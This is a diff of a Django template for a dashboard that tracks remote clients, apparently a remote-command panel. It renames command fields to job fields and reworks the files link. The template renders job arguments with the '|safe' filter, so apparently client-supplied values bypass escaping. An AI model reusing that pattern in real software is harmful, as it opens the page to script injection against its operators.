@@ -24,10 +24,10 @@
                 <th id="client_table_int_ip" class="client-table-m">Internal IP</th>
                 <th id="client_table_country" class="client-table-s">Country</th>
                 -->
-                <th id="client_table_command_id" class="client-table-xl">Command ID</th>
-                <th id="client_table_command" class="client-table-l">Command</th>
-                <th id="client_table_command_args" class="client-table-xl">Command args</th>
-                <th id="client_table_command_result">Command result</th>
+                <th id="client_table_job_id" class="client-table-xl">Job ID</th>
+                <th id="client_table_job" class="client-table-l">Job</th>
+                <th id="client_table_job_args" class="client-table-xl">Job args</th>
+                <th id="client_table_job_result">Job result</th>
                 <th id="client_table_ping" class="client-table-m" >Ping</th>
                 <th id="client_table_status" class="client-table-m">Status</th>
                 <th id="client_table_files" class="client-table-m">Files</th>
@@ -48,14 +48,14 @@
                 -->
                 <td>
                     <a onclick="showOrHideInfo(this);">
-                    [{{ client.command_id }}]
+                    [{{ client.job_id }}]
                     <br>
-                    ({{ client.command_datetime|date:"Y-m-d H:i:s" }})
+                    ({{ client.job_datetime|date:"Y-m-d H:i:s" }})
                     </a>
                 </td>
-                <td><a onclick="showOrHideInfo(this);">{{ client.command }}</a></td>
-                <td><a onclick="showOrHideInfo(this);">{{ client.command_args|pretty_args|safe }}</a></td>
-                <td><a onclick="showOrHideInfo(this);">{{ client.command_result|linebreaks|truncatechars:"300" }}</a></td>
+                <td><a onclick="showOrHideInfo(this);">{{ client.job }}</a></td>
+                <td><a onclick="showOrHideInfo(this);">{{ client.job_args|pretty_args|safe }}</a></td>
+                <td><a onclick="showOrHideInfo(this);">{{ client.job_result|linebreaks|truncatechars:"300" }}</a></td>
                 {% with client.last_activity_datetime|timediff as ping %}
                 <td>
                     <a onclick="showOrHideInfo(this);">
@@ -70,7 +70,7 @@
                 </td>
                 <td>
                     <a onclick="showOrHideInfo(this);">
-                    {% if client.command_id in client.command_result and ping < 16 %}
+                    {% if client.job_id in client.job_result and ping < 16 %}
                     IDDLE
                     {% elif ping > 100 %}
                     ------
@@ -80,7 +80,7 @@
                     </a>
                 </td>
                 {% endwith %}
-                <td><a href="/media/{{ client.client_id }}/">FILES</a></td>
+                <td><a href="{% url 'client_files' client.client_id %}" target="_blank">FILES</a></td>
             </tr>
             <tr id="client_table_{{ client.client_id }}_info_row" class="client-table-info-row">
                 <td></td>
